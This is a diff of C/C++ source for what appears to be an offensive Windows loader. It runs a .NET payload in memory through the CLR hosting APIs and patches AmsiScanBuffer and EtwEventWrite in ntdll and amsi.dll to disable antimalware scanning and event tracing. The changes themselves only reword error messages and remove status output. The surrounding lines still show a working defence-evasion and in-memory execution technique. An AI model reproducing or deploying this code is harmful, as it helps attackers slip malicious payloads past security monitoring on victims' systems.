@@ -172,7 +172,7 @@ int executeSharp(LPVOID lpPayload)
 
 	if (FAILED(hr))
 	{
-		printf("pMetaHost->EnumerateLoadedRuntimes failed w/hr 0x%08lx\n", hr);
+		printf("Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
 		return -1;
 	}
 	
@@ -184,7 +184,7 @@ int executeSharp(LPVOID lpPayload)
 
 		if (FAILED(hr))
 		{
-			printf("ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
+			wprintf(L"Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
 			return -1;
 		}
 
@@ -192,7 +192,7 @@ int executeSharp(LPVOID lpPayload)
 
 		if (FAILED(hr) || !bLoadable)
 		{
-			printf("ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
+			wprintf(L"Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
 			return -1;
 		}
 	}
@@ -223,8 +223,6 @@ int executeSharp(LPVOID lpPayload)
 		printf("ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
 		return -1;
 	}
-
-	printf("ICorRuntimeHost->GetDefaultDomain(...) succeeded\n");
 
 	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**) &pDefaultAppDomain);
 
@@ -328,11 +326,7 @@ VOID Execute(LPVOID lpPayload)
 	if (!AttachConsole(-1))
 		AllocConsole();
 
-	wprintf(L"Execution started\n");
-
 	executeSharp(lpPayload);
-
-	wprintf(L"Execution end\n");
 
 }
 
@@ -453,15 +447,18 @@ INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch) {
 
 BOOL PatchEtw()
 {
-	printf("Patching EtwEventWrite\n");
-
 	HMODULE lib = LoadLibraryA("ntdll.dll");
 	if (lib == NULL)
+	{
+		printf("Cannot load ntdll.dll");
 		return -2;
-
+	}
 	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
 	if (lpFuncAddress == NULL)
+	{
+		printf("Cannot get address of EtwEventWrite");
 		return -2;
+	}
 
 	// Add address of hook function to patch.
 	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;
@@ -472,15 +469,19 @@ BOOL PatchEtw()
 BOOL PatchAmsi()
 {
 
-	printf("Patching amsi\n");
-
 	HMODULE lib = LoadLibraryA("amsi.dll");
 	if (lib == NULL)
+	{
+		printf("Cannot load amsi.dll");
 		return -2;
+	}
 
 	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
 	if(addr == NULL)
+	{
+		printf("Cannot get address of AmsiScanBuffer");
 		return -2;
+	}
 
 	return InlinePatch(addr, amsipatch);
 }
